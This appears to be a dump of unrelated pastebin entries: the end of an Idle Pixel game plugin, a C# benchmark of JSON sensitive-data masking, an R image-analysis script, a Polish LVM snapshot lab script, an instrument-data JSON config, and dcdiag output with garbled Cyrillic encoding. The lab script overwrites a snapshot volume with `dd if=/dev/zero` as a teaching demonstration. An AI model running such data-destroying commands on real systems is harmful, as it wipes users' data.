            let fColor = `color: ${IdlePixelPlus.plugins['ui-tweaks'].getConfig('font-color-chat-area-chat-raid-password')}; `;

            if (lastMessageElement && 'innerHTML' in lastMessageElement) {
                let lastMessage = lastMessageElement.innerHTML;
                lastMessage = lastMessage.replace(regex, function (match) {
                    //console.log(""Found UUID"");
                    return `<a href=""#"" style=""${bgColor}${fColor}font-weight: bold; font-style:italic"" onclick=""IdlePixelPlus.plugins['ui-tweaks'].sendRaidJoinMessage('${match}'); switch_panels('panel-combat'); document.getElementById('game-panels-combat-items-area').style.display = 'none';document.getElementById('combat-stats').style.display = 'none';document.getElementById('game-panels-combat-raids').style.display = ''; return false;"">${player} Raid</a>`;
                });

                lastMessageElement.innerHTML = lastMessage;
            } else {
                console.log(""No valid last message element found"");
            }
        }

        sendRaidJoinMessage(uuid) {
            websocket.send(`JOIN_RAID_TEAM=${uuid}`);
        }

        copyTextToClipboard(text) {
            navigator.clipboard.writeText(text).then(function () {
                //console.log('Copying to clipboard was successful!');
            }, function (err) {
                console.error('Could not copy text: ', err);
            });
        }

    }

    const elementsWithWidth = document.querySelectorAll(""[width]"");
    elementsWithWidth.forEach(function (el) {
        el.setAttribute(""original-width"", el.getAttribute(""width""));
    });

    const elementsWithHeight = document.querySelectorAll(""[height]"");
    elementsWithHeight.forEach(function (el) {
        el.setAttribute(""original-height"", el.getAttribute(""height""));
    });

    const plugin = new UITweaksPlugin();
    IdlePixelPlus.registerPlugin(plugin);
})();
"
Qw38iA1N,ConverterResolverPerformanceComparison,pszczyg,C#,Monday 8th of April 2024 05:14:39 AM CDT,"using System;
using System.Linq;
using System.Reflection;
using Newtonsoft.Json;
using BenchmarkDotNet.Attributes;
using BenchmarkDotNet.Running;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Serialization;

namespace ConsoleApp
{
    internal class Program
    {
        static void Main()
        {
            BenchmarkRunner.Run<ListBenchmarks>();
        }
    }

    //Attribute used to decorate properties containing sensitive data
    [AttributeUsage(AttributeTargets.Property, Inherited = false, AllowMultiple = false)]
    public class SensitiveDataAttribute : Attribute
    {
        public SensitiveDataAttribute(string mask = ""***"")
        {
            Mask = mask;
        }
        public string Mask { get; } //Adjustable mask
    }

    public class ClassWithSensitiveData : IContainSecretData
    {
        [JsonIgnore]
        public string Header { get; set; } //This will not be serialized at all
        public string UserName { get; set; }
        [SensitiveData]
        public string Password { get; set; } //This will be serialized in form ""Password=***""
        public SubClassWithSensitiveData SensitiveData { get; set; }
    }

    public class SubClassWithSensitiveData : IContainSecretData
    {
        [SensitiveData]
        public string Header { get; set; } //Nested data we want to protect
        public string NotSecret { get; set; }
    }

    public interface IContainSecretData { } //Marker interface to recognize the objects containing sensitive data

    public class MaskSensitiveDataConverter : JsonConverter
    {
        public override bool CanConvert(Type objectType)
        {
            return typeof(IContainSecretData).IsAssignableFrom(objectType);
        }

        public override void WriteJson(JsonWriter writer, object value, JsonSerializer serializer)
        {
            var jObject = new JObject();
            foreach (var property in value.GetType().GetProperties())
            {
                var attributes = property.GetCustomAttributes(true);
                if (attributes.Any(attr => attr is JsonIgnoreAttribute)) { continue; }
                var secretAttribute = attributes.OfType<SensitiveDataAttribute>().FirstOrDefault();
                if (secretAttribute != null)
                {
                    jObject.Add(property.Name, secretAttribute.Mask);
                }
                else
                {
                    var propValue = property.GetValue(value);
                    if (propValue != null || serializer.NullValueHandling == NullValueHandling.Include)
                    {
                        var propToken = propValue != null ? JToken.FromObject(propValue, serializer) : JValue.CreateNull();
                        jObject.Add(property.Name, propToken);
                    }
                }
            }
            jObject.WriteTo(writer);
        }

        public override bool CanRead => false;
        public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer) => throw new NotImplementedException(""CanRead is false, this method cannot be invoked."");
    }

    public class MaskSensitiveDataProvider : IValueProvider
    {
        const string _sesitiveDatatag = ""***"";
        public object GetValue(object target)
        {
            return _sesitiveDatatag;
        }

        public void SetValue(object target, object value)
        {
            target = _sesitiveDatatag;
        }
    }

    public class MaskSensitiveDataResolver : DefaultContractResolver
    {
        protected override JsonProperty CreateProperty(MemberInfo member, MemberSerialization memberSerialization)
        {
            var property = base.CreateProperty(member, memberSerialization);

            if (member is PropertyInfo)
            {
                var prop = (PropertyInfo)member;
                var isSensitiveData = Attribute.IsDefined(prop, typeof(SensitiveDataAttribute));

                if (isSensitiveData)
                {
                    property.ValueProvider = new MaskSensitiveDataProvider();
                }
            }

            return property;
        }
    }

    public class ListBenchmarks
    {
        //Base test to compare results with. It just serializes the data without any modifications
        [Benchmark(Baseline = true)]
        public string WithoutConverter()
        {
            var data = new ClassWithSensitiveData
            {
                Password = ""password"",
                SensitiveData = new SubClassWithSensitiveData
                {
                    Header = ""HEADER"",
                    NotSecret = ""NotSecret""
                }
            };
            return JsonConvert.SerializeObject(data, Formatting.None, new JsonSerializerSettings
            {
                NullValueHandling = NullValueHandling.Ignore,
                ReferenceLoopHandling = ReferenceLoopHandling.Ignore
            });
        }
        //Test that serializes using converter
        [Benchmark]
        public string WithConverter()
        {
            var data = new ClassWithSensitiveData
            {
                Password = ""password"",
                SensitiveData = new SubClassWithSensitiveData
                {
                    Header = ""HEADER"",
                    NotSecret = ""NotSecret""
                }
            };
            return JsonConvert.SerializeObject(data, Formatting.None, new JsonSerializerSettings
            {
                NullValueHandling = NullValueHandling.Ignore,
                ReferenceLoopHandling = ReferenceLoopHandling.Ignore,
                Converters = new[] { new MaskSensitiveDataConverter() }
            });
        }
        //And the one that serializes using resolver
        [Benchmark]
        public string WithDataResolver()
        {
            var data = new ClassWithSensitiveData
            {
                Password = ""password"",
                SensitiveData = new SubClassWithSensitiveData
                {
                    Header = ""HEADER"",
                    NotSecret = ""NotSecret""
                }
            };
            return JsonConvert.SerializeObject(data, Formatting.None, new JsonSerializerSettings
            {
                NullValueHandling = NullValueHandling.Ignore,
                ReferenceLoopHandling = ReferenceLoopHandling.Ignore,
                ContractResolver = new MaskSensitiveDataResolver()
            });
        }
    }
}
"
trfBw4H3,startup sscript,Gewerd_Strauss,R,Monday 8th of April 2024 05:06:33 AM CDT,"load_extdata <- function(path = NULL) {
    if (is.null(path)) {
        dir(system.file(""extdata"", package = ""duflor""),full.names = T)
    } else {
        system.file(""extdata"", path, package = ""duflor"", mustWork = TRUE)
    }
}
remove_keys <- function(my_list, key_names) {
    for (key_name in key_names) {
        if (key_name %in% names(my_list)) {
            my_list[[key_name]] <- NULL
        } else {
            cat(""Key '"", key_name, ""' not found in the list.\n"", sep = """")
        }
    }
    return(my_list)

}

test_path <- load_extdata(""root_cropped.jpg"")
spectrums <- getOption(""duflor.default_hsv_spectrums"")
spectrums$lower_bound <- remove_keys(spectrums$lower_bound,c(""bex_green_HSV"",""bex_complete_HSV"",""bex_drought_HSV""))
spectrums$upper_bound <- remove_keys(spectrums$upper_bound,c(""bex_green_HSV"",""bex_complete_HSV"",""bex_drought_HSV""))

spectrums$lower_bound <- spectrums$lower_bound
spectrums$upper_bound <- spectrums$upper_bound
# spectrums$lower_bound$bex_root_HSV <- c(26.00, 0.10, 0.048)
# spectrums$lower_bound$bex_identifier_dot <- c(270.00, 0.20, 0)
# spectrums$lower_bound$bex_root_HSV <- c(26,0.1,0.)
rootarray <- load_image(test_path)
r <- duflor::extract_pixels_HSV(rootarray,lower_bound = spectrums$lower_bound,upper_bound = spectrums$upper_bound,fast_eval = T)"
ukUPkDsB,sysop_3.1.5_Full_Sredniki,pan7nikt,Bash,Monday 8th of April 2024 04:16:40 AM CDT,"#TO JEST WERSJA Z WYLISTOWANIEM OD RAZU (BARDZIEJ CZYTELNA ALE NIE NADA SIE CHYBA DLA SMOLINA)

#PRZED PRZGOTOWANIEM ZADANIA 
sudo fdisk /dev/sda
#n
#4 lub enter
#enter
#+1G
#t
#4
#44
#w
sudo pvcreate /dev/sda4
sudo vgextend fedora /dev/sda4
sudo lvextend -L +400M /dev/fedora/home
sudo resize2fs /dev/fedora/home

sudo lvcreate -s -L 100M -pr -n migawka_home /dev/fedora/home

fdisk /dev/sdb
#g
#n
#enter lub 1
#enter
#+2G
#w
sudo mkfs.xfs /dev/sdb1
sudo mkdir /mnt/kopia
sudo mount /dev/sdb1 /mnt/kopia/
sudo dump -0u -f /mnt/kopia/kopia_home /dev/fedora/migawka_home
df /home
df /mnt/kopia/kopia_home
lvdisplay /dev/fedora/migawka_home

#POCZATEK ZADANIA (TO JUZ MOZNA WKLEIC CALY)
echo -e '\033[0;32m3.1.5.1\033[0m';
echo -e '\033[0;32mKopia zapasowa musi byc:\033[0m';
echo -e '\033[0;32m- Spojna w czasie\033[0m';
echo -e '(stan plikow z tej samej chwili czasu)';
echo -e '\033[0;32m- Tworzona regularnie\033[0m';
echo -e '\033[0;32m- Przechowywana na innym fizycznym nosniu danych\033[0m';
df /home | grep /dev/mapper/fedora-home;
df /mnt/kopia/kopia_home | grep /dev/sdb1;
echo -e '\033[0;32m- finalna lokalizacja powinna byc zabezpieczona (dostep, utrata, uszkodzenie)\033[0m';
echo -e '\033[0;32m3.1.5.2\033[0m';
echo -e 'Poniewaz migawki udostepniaja spojny stan zawartosci wolumenu logicznego bez koniecznosci zatrzymania realizacji operacji wejscia/wyjscia (spojny czas, mniej bledow)';
echo -e '\033[0;32m3.1.5.3\033[0m';
sudo lvdisplay /dev/fedora/migawka_home;
echo -e '\033[0;32mRozmiar bufora:\033[0m';
sudo lvdisplay /dev/fedora/migawka_home | grep ""COW-table size"";
echo -e 'Bufor ten okresla ile miejsca jest zarezerwowane dla zmian zapisywanych po utworzeniu migawki';
echo -e '\033[0;32mRozmiar przestrzeni danych wolumenu logicznego migawki:\033[0m';
sudo lvdisplay /dev/fedora/migawka_home | grep ""LV Size""
echo -e 'jest to rozmiar oryginalnego wolumenu, zostal ustawiony automatycznie. Okresla calkowita przestrzen zarezerwowana dla migawki.';
echo -e '\033[0;32m3.1.5.4\033[0m';
echo 'Kiedy bufor COW sie zapelni (migawka nie jest juz spojna w czasie, czyli nie dostarcza pelnego stanu)';
echo -e '\033[0;32mWykazanie:\033[0m';
sudo lvcreate -L 12M -s -n bezuzyteczna_migawka /dev/fedora/home;
sudo dd if=/dev/zero of=/dev/fedora/bezuzyteczna_migawka bs=1M count=12;
sudo lvs fedora
echo -e '\033[0;32m100% bufora COW jest zajete:\033[0m';
sudo lvs fedora |& grep 'Data%\|100,00 ';
sudo lvdisplay /dev/fedora/bezuzyteczna_migawka;
echo -e '\033[0;32mMigawka jest bezuzyteczna (INACTIVE):\033[0m';
sudo lvdisplay /dev/fedora/bezuzyteczna_migawka | grep INACTIVE;
echo -e '\033[0;32m3.1.5.5\033[0m';
echo -e 'Mozna. Jezeli rozmiar bufora COW >= Rozmiar urzadzenia blokowego, dla ktorego wykonano migawke';
echo -e '\033[0;32m3.1.5.6\033[0m'
echo -e 'Najmniejszy mozliwy rozmiar bufora jest rowny rozmiarowi jednostki alokacji PE grupy wolumenow.\nW tym przypadku to 4MiB';
echo -e '\033[0;32mProba ustawienia mniejszego rozmiaru bufora:\033[0m';
sudo lvcreate -L 3M -prw -s -n migawka_small /dev/fedora/home;
sudo lvdisplay /dev/fedora/migawka_small;
echo -e '\033[0;32mWielkosc bufora zostala automatycznie zaokraglona do minimalnej wartosci (4MiB):\033[0m';
sudo lvdisplay /dev/fedora/migawka_small |& grep 'LV Write Access\|COW-table size';"
qy2Tetdx,oproc_config.json,wolkchen,JSON,Monday 8th of April 2024 04:00:00 AM CDT,"[
    {
        ""name"": ""timestep"",
        ""val"": 0.5,
        ""dtype"": ""float"",
        ""unit"": ""s"",
        ""desc"": ""global timestep for dataframes""
    },
    {
        ""name"": ""h5ver"",
        ""val"": ""v110"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""Version of HDF5 to use with the data archive""
    },
    {
        ""name"": ""groupDTformat"",
        ""val"": ""%Y%m%d_%H%M%S"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""date-time format for HDF5 groups""
    },
    {
        ""name"": ""nominalDTformat"",
        ""val"": ""%Y-%m-%d %H:%M:%S"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""date-time format for HDF5 groups""
    },
    {
        ""name"": ""dir_structure"",
        ""val"": {
            ""Raw"": {
                ""Met"": [],
                ""FC"": [],
                ""FC Proc"": [],
                ""Rejected"": [],
                ""Misc"": [],
                ""UCASS"": []
            },
            ""Processed"": []
        },
        ""dtype"": ""dict"",
        ""unit"": ""n/a"",
        ""desc"": ""raw data directory structure""
    },
    {
        ""name"": ""valid_flags"",
        ""val"": [
            {
                ""name"": ""Time"",
                ""unit"": ""datetime"",
                ""desc"": ""date-time stamp""
            },
            {
                ""name"": ""C#"",
                ""unit"": """",
                ""desc"": ""number of particles in bin #""
            },
            {
                ""name"": ""ToF#"",
                ""unit"": ""us"",
                ""desc"": ""time of flight bin #""
            },
            {
                ""name"": ""Period"",
                ""unit"": ""s"",
                ""desc"": ""actual sample period""
            },
            {
                ""name"": ""CSum"",
                ""unit"": """",
                ""desc"": ""checksum; total counts""
            },
            {
                ""name"": ""Glitch"",
                ""unit"": """",
                ""desc"": ""number of glitch (short ToF) rejects""
            },
            {
                ""name"": ""LToF"",
                ""unit"": """",
                ""desc"": ""number of long time of flight rejects""
            },
            {
                ""name"": ""RejRat"",
                ""unit"": """",
                ""desc"": ""number of particle rejects""
            },
            {
                ""name"": ""Airspeed"",
                ""unit"": ""mps"",
                ""desc"": ""resultant airspeed""
            },
            {
                ""name"": ""Roll"",
                ""unit"": ""deg"",
                ""desc"": ""ucass roll angle""
            },
            {
                ""name"": ""Pitch"",
                ""unit"": ""deg"",
                ""desc"": ""ucass pitch angle""
            },
            {
                ""name"": ""Yaw"",
                ""unit"": ""deg"",
                ""desc"": ""ucass yaw angle""
            },
            {
                ""name"": ""Lat"",
                ""unit"": ""deg"",
                ""desc"": ""decimal latitude""
            },
            {
                ""name"": ""Lng"",
                ""unit"": ""deg"",
                ""desc"": ""decimal longitude""
            },
            {
                ""name"": ""Alt"",
                ""unit"": ""m"",
                ""desc"": ""altitude""
            },
            {
                ""name"": ""Spd"",
                ""unit"": ""mps"",
                ""desc"": ""groundspeed of ucass""
            },
            {
                ""name"": ""Press"",
                ""unit"": ""hPa"",
                ""desc"": ""absolute barometric pressure""
            },
            {
                ""name"": ""Temp"",
                ""unit"": ""degC"",
                ""desc"": ""air temperature""
            },
            {
                ""name"": ""RH"",
                ""unit"": ""%"",
                ""desc"": ""relative humidity""
            },
            {
                ""name"": ""bbs"",
                ""unit"": ""number"",
                ""desc"": ""list of bin boundaries (adc)""
            },
            {
                ""name"": ""SA"",
                ""unit"": ""m**2"",
                ""desc"": ""sample area""
            },
            {
                ""name"": ""cali_coeffs"",
                ""unit"": ""number"",
                ""desc"": ""Calibration coefficients for instrument""
            },
            {
                ""name"": ""bbs_sca"",
                ""unit"": ""m**2"",
                ""desc"": ""list of cross section bin boundaries (calibrated)"",
                ""proc"": ""Calibrate""
            },
            {
                ""name"": ""sca"",
                ""unit"": ""m**2"",
                ""desc"": ""scattering cross section""
            }
        ],
        ""dtype"": ""list"",
        ""unit"": ""n/a"",
        ""desc"": ""valid falgs which can be specified for import, also serves as metadata""
    },
    {
        ""name"": ""base_data_path"",
        ""val"": ""/home/wolkchen/Documents/UCASS/UCASSData"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""base path from which all data is accessed""
    },
    {
        ""name"": ""ucass_calibration_path"",
        ""val"": ""/home/wolkchen/Documents/UCASS/UCASSCali"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""path to ucass calibration variables""
    },
    {
        ""name"": ""ucass_material_path"",
        ""val"": ""/home/wolkchen/Documents/UCASS/UCASSMaterial"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""path to ucass material data variables""
    },
    {
        ""name"": ""instrument_data_path"",
        ""val"": ""/home/wolkchen/Documents/UCASS/InstrumentData"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""path to instrument variables""
    },
    {
        ""name"": ""log_path"",
        ""val"": ""/tmp/oproc.log"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""path to log""
    },
    {
        ""name"": ""data_flags"",
        ""val"": {
            ""1"": {
                ""data"": {
                    ""cols"": [
                        ""Time"",
                        [
                            ""Temp"",
                            ""degC""
                        ],
                        [
                            ""Press"",
                            ""hPa""
                        ],
                        [
                            ""RH"",
                            ""%""
                        ]
                    ]
                },
                ""type"": ""Met""
            },
            ""2"": {
                ""data"": {
                    ""cols"": [
                        ""Time"",
                        ""C1"",
                        ""C2"",
                        ""C3"",
                        ""C4"",
                        ""C5"",
                        ""C6"",
                        ""C7"",
                        ""C8"",
                        ""C9"",
                        ""C10"",
                        ""C11"",
                        ""C12"",
                        ""C13"",
                        ""C14"",
                        ""C15"",
                        ""C16"",
                        [
                            ""ToF1"",
                            ""tof""
                        ],
                        [
                            ""ToF3"",
                            ""tof""
                        ],
                        [
                            ""ToF5"",
                            ""tof""
                        ],
                        [
                            ""ToF7"",
                            ""tof""
                        ],
                        [
                            ""Period"",
                            ""pp""
                        ],
                        ""CSum"",
                        ""Glitch"",
                        ""LToF"",
                        ""RejRat""
                    ],
                    ""srow"": ""5"",
                    ""procrows"": {
                        ""bbs"": {
                            ""row"": ""3"",
                            ""cols"": ""0:16""
                        }
                    }
                },
                ""type"": ""UCASS""
            },
            ""3"": {
                ""data"": {
                    ""ARSP"": [
                        [
                            ""Airspeed"",
                            ""mps""
                        ]
                    ],
                    ""ATT"": [
                        [
                            ""Roll"",
                            ""deg""
                        ],
                        [
                            ""Pitch"",
                            ""deg""
                        ],
                        [
                            ""Yaw"",
                            ""deg""
                        ]
                    ],
                    ""GPS"": [
                        [
                            ""Lat"",
                            ""deg""
                        ],
                        [
                            ""Lng"",
                            ""deg""
                        ],
                        [
                            ""Alt"",
                            ""m""
                        ],
                        [
                            ""Spd"",
                            ""mps""
                        ]
                    ],
                    ""BARO"": [
                        [
                            ""Press"",
                            ""Pa""
                        ]
                    ]
                },
                ""type"": ""FC Proc""
            }
        },
        ""dtype"": ""dict"",
        ""unit"": ""n/a"",
        ""desc"": ""flags for data headers, read \""valid_flags\"" config entry for details""
    },
    {
        ""name"": ""tag_suffix"",
        ""val"": ""#"",
        ""dtype"": ""str"",
        ""unit"": ""n/a"",
        ""desc"": ""suffix for tag variables""
    }

]"
UZZzW3zc,Untitled,divnull,PowerShell,Monday 8th of April 2024 03:27:48 AM CDT,"PS C:\Users\div> dcdiag

–î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞ –∫–∞—Ç–∞–ª–æ–≥–æ–≤

–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞—á–∞–ª—å–Ω–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–∏:
   –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–∏—Å–∫–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞...
   –û—Å–Ω–æ–≤–Ω–æ–π —Å–µ—Ä–≤–µ—Ä = mail
   * –ò–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω –ª–µ—Å AD.
   –°–±–æ—Ä –Ω–∞—á–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∑–∞–≤–µ—Ä—à–µ–Ω.

–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã—Ö –Ω–∞—á–∞–ª—å–Ω—ã—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫

   –°–µ—Ä–≤–µ—Ä –ø—Ä–æ–≤–µ—Ä–∫–∏: Default-First-Site-Name\MAIL
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: Connectivity
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ Connectivity

–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ—Å–Ω–æ–≤–Ω—ã—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫

   –°–µ—Ä–≤–µ—Ä –ø—Ä–æ–≤–µ—Ä–∫–∏: Default-First-Site-Name\MAIL
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: Advertising
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ Advertising
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: FrsEvent
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ FrsEvent
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: DFSREvent
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ DFSREvent
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: SysVolCheck
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ SysVolCheck
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: KccEvent
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ KccEvent
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: KnowsOfRoleHolders
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ KnowsOfRoleHolders
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: MachineAccount
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ MachineAccount
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: NCSecDesc
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ NCSecDesc
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: NetLogons
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ NetLogons
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: ObjectsReplicated
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ ObjectsReplicated
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: Replications
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ Replications
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: RidManager
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ RidManager
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: Services
         ......................... MAIL - –ø—Ä–æ–π–¥–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ Services
      –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: SystemLog
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:01:45
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:01:57
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:02:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\crypt32.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
